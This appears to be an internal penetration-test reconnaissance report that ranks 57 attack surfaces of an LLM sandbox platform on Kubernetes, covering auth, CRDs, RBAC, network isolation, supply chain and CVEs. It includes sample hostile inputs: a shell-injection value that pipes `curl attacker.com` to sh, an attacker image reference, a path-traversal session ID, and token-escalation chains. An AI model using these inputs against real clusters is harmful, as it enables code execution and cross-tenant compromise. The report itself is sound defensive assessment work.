# Phase 1 Mandatory Artefact — Attack Surface Inventory

**Phase:** 1 (Reconnaissance)
**Date:** 2026-05-30
**Cluster:** `admin@home-kubernetes` (LLMSafeSpace `sha-cdf2ddc`/`cdd6305`, chart rev 68, **pre-G16**)
**Method:** consolidation of RT-1.1 through RT-1.9. Each entry cites the source RT for full context.

---

## Purpose

This is the consolidated cross-reference. RT-1.1–1.9 each produce findings against a single layer (API, CRD, RBAC, network, deps, images, secrets, frontend, build chain). Phase 2+ test cases need a single ranked surface so the pentester can prioritize what to attack first.

Findings are ranked by **(exposure × authentication gate × blast radius)**.

- **Exposure**: external-internet > cluster-wide > namespace > local-only
- **Auth gate**: open > authenticated > admin > host-only
- **Blast radius**: cluster-takeover > tenant-takeover > workspace-takeover > info-disclosure

---

## Tier 0 — Open / unauthenticated, externally reachable

These have no auth gate AND are exposed via Ingress (`safespace.thekao.cloud`). Highest priority: a successful exploit here needs no credentials.

| # | Surface | Source | Concrete attack |
|---|---|---|---|
| T0.1 | `POST /api/v1/auth/register` | RT-1.1 | Registration spam → DB pollution. Behind global rate limiter (1/min) but no per-IP bound. |
| T0.2 | `POST /api/v1/auth/login` | RT-1.1 | User enumeration via error-message timing/text. Cross-ref RT-1.1 F1.1.7. |
| T0.3 | `POST /api/v1/account/recover` | RT-1.1 F1.1.5 | **High-value endpoint behind only the global rate limiter.** Brute-force recovery flow. |
| T0.4 | `GET /readyz` | RT-1.1 F1.1.1 | Driver-error string leak on Postgres/Redis outage. |
| T0.5 | `GET /metrics` | RT-1.1 F1.1.3 | Prometheus cardinality reveals user counts, route templates, internal state. **Unauthenticated cluster-wide AND externally if exposed on ingress.** Verify ingress routing. |
| T0.6 | `GET /` (frontend SPA) | RT-1.8 F1.8.6 | **No CSP header on HTML shell.** Only `/api/*` responses carry CSP. XSS via assistant content reaches the user's session JWT (which is `lsp_session` HttpOnly cookie — see T0.7). |
| T0.7 | `lsp_session` cookie | RT-1.8 F1.8.4 | Cookie is `HttpOnly`, but `ThemeProvider.tsx:30` reads it via `document.cookie.includes(…)` to gate API sync — always false; dead code. Indicates a misconception that may bite future code. |

---

## Tier 1 — Authenticated, namespace-wide

Any authenticated user can reach. Ownership checks must happen in handlers; gaps are silent privilege escalations.

| # | Surface | Source | Concrete attack |
|---|---|---|---|
| T1.1 | `:sessionId` path traversal in proxy URLs | RT-1.1 F1.1.2 | `proxy.go:171, 181, 186, 191, 196` — user-supplied `sessionId` interpolated into upstream URL with no validation. Send `sessionId="../admin"` and observe upstream behaviour. |
| T1.2 | `Spec.Runtime` arbitrary image pull | RT-1.2 F1.2.1 | `runtime: "evil.example.com/img:latest"` → kubelet pulls attacker image. **No allowlist anywhere in CRD/webhook/controller.** Verify whether the API service applies an allowlist; if not, direct code-exec. |
| T1.3 | `Status.PodIP/PodName/PodNamespace` forge | RT-1.2 F1.2.2 | With `patch workspaces/status`, redirect API proxy traffic and terminal sessions to attacker-chosen pods. Cluster-side privilege escalation by data injection. |
| T1.4 | `Spec.Resources` unenforced | RT-1.2 F1.2.3 | Workspace pods have **no CPU/memory limits**. Cluster DoS by single workspace. |
| T1.5 | `Spec.NetworkAccess` unenforced | RT-1.2 F1.2.4 | Per-workspace egress allowlist silently ignored. Sandbox can reach anywhere allowed by the cluster-wide policy (currently: nothing — pre-fix). |
| T1.6 | `Spec.Packages[].Requirements[]` shell injection | RT-1.2 F1.2.5 | `requirements: ["evil; curl attacker.com\|sh"]` injects into init-container shell. PVC R/W in init container. |
| T1.7 | `POST /api/v1/secrets/:id/reveal` | RT-1.1 | Returns plaintext secret value. IDOR: attempt to reveal another user's secret. |
| T1.8 | `Spec.Storage.StorageClassName` unbounded | RT-1.2 F1.2.9 | Pick any StorageClass on cluster, including malicious / expensive. |
| T1.9 | `POST /api/v1/auth/api-keys` | RT-1.1 | Creates key, returns plaintext. Stored cleartext in DB (RT-1.7 F1.7.2). |

---

## Tier 2 — Cross-tenant lateral movement (live cluster)

The live cluster has zero L3/L4 isolation between workspaces (RT-1.4 F1.4.1). An authenticated attacker who escapes their sandbox or compromises one tenant's pod can reach every other tenant's pod. **In the post-G16 system this collapses, but the live cluster is vulnerable now.**

| # | Surface | Source | Concrete attack |
|---|---|---|---|
| T2.1 | Cross-sandbox TCP open | RT-1.4 F1.4.1 | Sandbox A → sandbox B's `:4096` and `:4097` directly accessible. |
| T2.2 | agentd `/v1/healthz`, `/v1/statusz` unauth | RT-1.4 F1.4.2 | Cross-tenant info disclosure: session list, providers, agent version, last error. **Even post-G16, reachable from API pod — verify path-based authz.** |
| T2.3 | Controller `/metrics:8080` unauth | RT-1.4 F1.4.3 | Workspace UIDs in metric labels. Reveals tenant existence + reconcile state. |
| T2.4 | Postgres / Redis TCP open from sandbox | RT-1.4 §4 | Auth blocks queries but TCP open enables version probing, 0-day attacks, DoS via half-open. |
| T2.5 | `kube-apiserver` reachable from sandbox | RT-1.4 §4 | Sandbox SA is `default` (minimal); but token still grants `selfsubjectreviews` and a few read paths. |
| T2.6 | Plain-HTTP secret-reload from API to sandbox | RT-1.7 F1.7.1 | `api/internal/handlers/secrets.go:291` POSTs decrypted user secrets over `http://...:4097/v1/reload-secrets` — no TLS, no auth. **Pre- AND post-G16, this is in-cluster but unauthenticated.** |

---

## Tier 3 — Privileged subjects (controller / API ServiceAccount blast radius)

If the controller SA or API SA token leaks (e.g. via T2.4-T2.5 path-traversal compromise of API pod), what's at risk?

| # | Subject | Scope | Worst case if leaked | Source |
|---|---|---|---|---|
| T3.1 | Controller SA token | cluster-wide CRUD on Secrets | **Read every Secret cluster-wide**: kube-system, etcd-encryption keys, CNI tokens, cert-manager CAs, customer credentials → cluster-admin equivalent | RT-1.3 F1.3.1, F1.3.3 |
| T3.2 | Controller SA token | cluster-wide CRUD on NetworkPolicies | Mass-delete → all default-deny posture collapses | RT-1.3 F1.3.1 |
| T3.3 | Controller SA token | cluster-wide CRUD on `coordination.k8s.io/leases` | Steal `kube-controller-manager`/`kube-scheduler`/`coredns` leader leases → cluster-wide DoS | RT-1.3 F1.3.2 |
| T3.4 | Controller SA token | cluster-wide CRUD on configmaps | Tamper with `kube-system/coredns` corefile → cluster-wide DNS hijack | RT-1.3 F1.3.1 |
| T3.5 | Controller SA token | cluster-wide CRUD on services | Replace `kube-dns` selector → DNS poisoning. Replace `kubernetes.default` endpoints → cluster API MITM | RT-1.3 F1.3.1 |
| T3.6 | API SA token | namespace `pods/exec` (no label filter) | Exec into controller pod → 2-stage escalation to controller cluster-wide token | RT-1.3 F1.3.6 |
| T3.7 | API SA token | namespace `secrets` read | Read chart `<release>-credentials` Secret (postgres-password, redis-password, **jwt-secret**) → mint arbitrary auth tokens | RT-1.3 F1.3.3 |
| T3.8 | API SA token | namespace `pods/log` (granted, unused) | Log exfil from any workspace-ns pod | RT-1.3 F1.3.5 |
| T3.9 | API SA token | namespace `runtimeenvironments` CRUD (granted, unused) | Swap runtime images → poison every newly-spawned sandbox | RT-1.3 F1.3.4 |

---

## Tier 4 — Supply chain / build-time

Pre-pentest baseline. Each is a path an attacker could use to backdoor a future build.

| # | Surface | Source | Notes |
|---|---|---|---|
| T4.1 | All FROM lines float (no digest pin) | RT-1.9 F1 | Renovate auto-merges base bumps. Tag-poisoning upstream → backdoor in next image build. |
| T4.2 | opencode binary downloaded over TLS only, no checksum/sig | RT-1.9 F2; RT-1.6 | `runtimes/base/Dockerfile:73-77`. Upstream MITM or compromised release artefacts → backdoor in every sandbox. |
| T4.3 | mise binary downloaded over TLS only | RT-1.9 F2 | Same risk class as T4.2. |
| T4.4 | NodeSource installer piped to root bash | RT-1.9 F3 | `runtimes/nodejs/Dockerfile:8` — `curl ... \| bash` as root. |
| T4.5 | `MISE_GITHUB_ATTESTATIONS=0` | RT-1.9 F10 | Mise's only provenance check is explicitly disabled. |
| T4.6 | No cosign signing on GHCR push | RT-1.9 F7 | No image-signature verification possible at deploy time. |
| T4.7 | No SLSA build-provenance attestation | RT-1.9 F8, F14 | Project at SLSA L0. |
| T4.8 | `GOSUMDB=off` in Go runtime image | RT-1.9 F15 | Module checksum verification disabled inside the runtime. |
| T4.9 | 9 of 11 download sites unverified | RT-1.9 §5 | Only `npm ci` and `go mod download` are cryptographically verified. |
| T4.10 | `lucide-react@1.16.0` version anomaly | RT-1.8 F1.8.1 | Public registry's lucide-react is `0.x`. Check `package-lock.json` integrity hash. |

---

## Tier 5 — Known CVEs in shipped code

From RT-1.5 govulncheck output (17 reachable vulnerabilities):

| # | Module | Vulnerability | Source |
|---|---|---|---|
| T5.1 | `github.com/golang-jwt/jwt/v5` | reachable CVE | RT-1.5 F1 |
| T5.2 | `golang.org/x/net` | reachable CVE | RT-1.5 F2 |
| T5.3 | `github.com/mitchellh/mapstructure` | reachable CVE | RT-1.5 F3 |
| T5.4 | `github.com/moby/spdystream` | reachable CVE | RT-1.5 F4 |
| T5.5 | Go stdlib | 9 reachable vulns; `go1.25.5`, fixes in `1.25.6+` | RT-1.5 govulncheck |
| T5.6 | `axios@1.4.0` (in user runtimes shipped to sandboxes) | CVE-2024-39338 | RT-1.6 |
| T5.7 | `requests==2.31.0` (in user runtimes shipped to sandboxes) | CVE-2024-35195 | RT-1.6 |
| T5.8 | `GO_VERSION=1.20.5` default in runtime | EOL | RT-1.6 |
| T5.9 | esbuild/vite chain (frontend devDeps only) | 6 moderate | RT-1.5 npm audit |

---

## Tier 6 — Schema drift / latent footguns

Currently safe but a future schema-fix could turn each into a vulnerability.

| # | Item | Source | Why it matters |
|---|---|---|---|
| T6.1 | `autoApprovePermissions` declared in Go, pruned by apiserver | RT-1.2 F1.2.6 | API reads field for authz decision; future "fix the CRD" without auth review = silent privilege escalation |
| T6.2 | Helm CRD drift (missing `requiresCredentials`, `imageTag`, status fields) | RT-1.2 F1.2.7 | Helm-deployed clusters have a different runtime CRD than canonical |
| T6.3 | `Spec.PodSecurityContext.SeccompProfile` declared but never applied | RT-1.2 F1.2.8 | "I asked for runtime/default profile" promise is unmet |
| T6.4 | `Spec.NetworkAccess` declared but never enforced | RT-1.2 F1.2.4 | Looks like security control; isn't |
| T6.5 | `Spec.SecurityLevel`, `Spec.Credentials`, `Spec.Resources.cpuPinning` declared but not consumed | RT-1.2 | Security theater |
| T6.6 | `pods/status` granted to controller SA but unused | RT-1.3 F1.3.1 | Granting unused permissions violates least-privilege |
| T6.7 | NetPol ingress rule pins to `.Release.Namespace` not workspaceNamespace | RT-1.4 F1.4.5 | Misrenders if operator splits workspaces into separate ns |

---

## Counts by tier

| Tier | Count |
|---|---|
| T0 (open/unauth) | 7 |
| T1 (authn + namespace) | 9 |
| T2 (cross-tenant) | 6 |
| T3 (priv-subject blast) | 9 |
| T4 (supply chain) | 10 |
| T5 (known CVEs) | 9 |
| T6 (latent footguns) | 7 |
| **Total** | **57 distinct findings** |

---

## Recommended Phase 2+ priority

Run Phase 2 tests in this order:

1. **T0.3 (account recovery brute-force)** + **T0.2 (user enumeration)** — open-internet, no creds needed, fast to test.
2. **T1.2 (image-pull bypass)** + **T1.3 (status forge SSRF)** — authn-only, single-request exploit, devastating impact.
3. **T1.6 (init-container shell injection)** — same.
4. **T2.1 + T2.2 + T2.3 (cross-tenant lateral movement)** — verify the live cluster's complete absence of NetworkPolicy.
5. **T3.1 (controller SA cluster-wide secret read)** — chain to T0/T1 if any of those compromise the controller pod.
6. **T0.5 (metrics scrape)** + **T0.4 (driver-error leak)** — info disclosure that primes later phases.
7. **T4.1–T4.10** — supply-chain — usually documented as "deferred to upgrade" rather than tested live; cite as out-of-scope-but-noted.
8. **T5 series (CVE patching)** — straightforward upgrade work; confirm none have working exploits available before deferring.
9. **T6 series (latent footguns)** — defer to threat-model documentation; not exploitable today.
